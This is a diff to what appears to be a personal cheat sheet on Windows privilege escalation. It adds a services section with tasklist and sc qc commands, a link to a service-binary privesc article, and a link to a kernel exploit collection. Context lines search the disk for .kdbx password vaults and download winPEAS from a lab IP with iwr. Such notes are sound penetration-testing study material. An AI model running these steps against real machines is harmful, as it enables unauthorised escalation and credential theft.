@@ -21,7 +21,11 @@
 - get path of a process: ``` Get-Process | Select-Object Name,Path | Select-String "NonStandardProcess" ```
 - Check if have remote access (rdp) ``` net user xxx``` and see local group memberships
     have = *Remote Management Use Users*
-- ``` sc qc {Service} ``` [CMD Only] check service running by who
+
+## Fucking window services
+- https://medium.com/@arunc4cyber/windows-privilege-escalation-service-binary-path-write-based-privesc-with-service-full-access-a9adec0112a7 
+1. Get all task``` tasklist /svc ```
+2. ``` sc qc {Service} ``` [CMD Only] check service running by who
 
 ## Hidden info
 - Searching attackable files in system ``` Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue ``` 
@@ -40,6 +44,9 @@
 ### Winpeas (may be info not correct)
 - Get file from remote ``` iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe ```
   
+
+# Kernal Exploit
+- https://github.com/SecWiki/windows-kernel-exploits
 
 # Hijack window service
 - Target find some exe origin is from that user and able to modify
